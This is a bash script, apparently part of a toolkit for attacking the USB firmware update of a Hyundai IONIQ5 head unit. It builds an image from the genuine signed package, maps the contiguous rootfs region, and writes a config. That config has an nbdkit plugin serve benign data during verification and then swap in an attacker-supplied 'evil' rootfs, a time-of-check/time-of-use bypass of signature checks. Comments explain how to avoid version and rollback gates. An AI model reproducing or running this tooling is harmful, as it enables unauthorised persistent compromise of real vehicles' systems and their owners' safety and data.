#!/bin/bash
# Build the BASELINE USB image (genuine, signed package) and emit regions.json describing
# the dynamic rootfs region for nbdkit_toctou.py. The genuine mango-rootfs.tar.gz is written
# FIRST on a fresh filesystem so it is contiguous (one extent) -> single swap region.
#
#   02_build_usb_image.sh <package_dir> <evil_rootfs.te2> [out_img] [fs: exfat|ext4]
# package_dir = a copy of the IONIQ5 update tree (contains HU/images/mango-rootfs.tar.gz, .ver,
#               .lge.upgrade.xml, AppUpgrade, etc.) AT THE SAME VERSION the car runs (260128).
#               No version bump needed: a same-version reinstall is an allowed update path and the
#               rootfs swap is version-independent. Safer on revert (re-lays the identical genuine
#               version, no downgrade / rollback-protection concern) and skips the XML version gate
#               entirely, so regions.json carries ONLY the benign_then_evil rootfs region.
#               Caveat: confirm the HU actually runs the install pass on a same-version package
#               (reinstall/repair) rather than short-circuiting "already up to date" — the
#               toctou.log SWITCH line proves install was reached.
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
PKG="${1:?usage: 02_build_usb_image.sh <package_dir> <evil_rootfs.te2> [out_img] [fs]}"
EVIL="${2:?need evil_rootfs.te2}"
IMG="${3:-$HERE/build/usb.img}"; FS="${4:-exfat}"
REL="HU/images/mango-rootfs.tar.gz"
test -f "$PKG/$REL" || { echo "no $PKG/$REL"; exit 1; }
test -f "$EVIL" || { echo "no evil $EVIL"; exit 1; }
mkdir -p "$(dirname "$IMG")"
# size image = package size + 15% slack, min 1200MB
PKGSZ=$(du -sb "$PKG" | awk '{print $1}')
IMGSZ=$(( PKGSZ + PKGSZ/7 + 64*1024*1024 ))
echo "[*] image size ~$((IMGSZ/1024/1024)) MiB, fs=$FS"
rm -f "$IMG"; truncate -s "$IMGSZ" "$IMG"
if [ "$FS" = exfat ]; then mkfs.exfat -n IONIQ5_EU "$IMG" >/dev/null; else mkfs.ext4 -q -F -L IONIQ5_EU "$IMG"; fi
MP="$(mktemp -d)"
# NOTE: needs root/loop to mount. On the Pi run this script with sudo.
sudo mount -o loop "$IMG" "$MP"
cleanup(){ sudo umount "$MP" 2>/dev/null || true; rmdir "$MP" 2>/dev/null || true; }
trap cleanup EXIT
echo "[*] writing mango-rootfs FIRST (for contiguity)"
sudo mkdir -p "$MP/HU/images"
sudo cp --reflink=never "$PKG/$REL" "$MP/$REL"; sync
echo "[*] copying the rest of the package"
( cd "$PKG" && sudo cp -a --reflink=never --parents $(find . -type f ! -path "./$REL" | sed 's|^\./||') "$MP/" ) 2>/dev/null || \
  sudo rsync -a --exclude="$REL" "$PKG"/ "$MP"/
sync
echo "[*] computing contiguous extent of $REL"
MANGO="$MP/$REL"
FRAG=$(sudo filefrag -b512 -e "$MANGO" 2>/dev/null || true)
echo "$FRAG" | sed -n '1,8p'
NEXT=$(echo "$FRAG" | grep -c '^[[:space:]]*[0-9]*:')
# extract first extent physical start (512-byte units) and the file length
PHYS512=$(echo "$FRAG" | awk -F: '/^[[:space:]]*0:/{gsub(/[^0-9.]/,"",$3); split($3,a,"."); print a[1]; exit}')
LEN=$(stat -c%s "$MANGO")
OFF=$(( PHYS512 * 512 ))
cleanup; trap - EXIT
if [ "$NEXT" -ne 1 ]; then
  echo "WARNING: $REL is in $NEXT extents, not 1. The plugin expects one contiguous region."
  echo "  -> rebuild with a larger/fresh image, or extend regions.json with each extent."
fi
cat > "$HERE/build/regions.json" <<JSON
[
  { "off": $OFF, "len": $LEN, "evil": "$(readlink -f "$EVIL")", "switch_after_pass": 2, "mode": "benign_then_evil" }
]
JSON
echo "[DONE] baseline=$IMG"
echo "[DONE] regions.json: rootfs region off=$OFF len=$LEN (bytes)"
echo "       evil=$(readlink -f "$EVIL")"
echo "Verify the region maps to the genuine mango-rootfs by: cmp <(dd if=$IMG bs=1 skip=$OFF count=16 2>/dev/null) <(dd if=$PKG/$REL bs=1 count=16 2>/dev/null)"
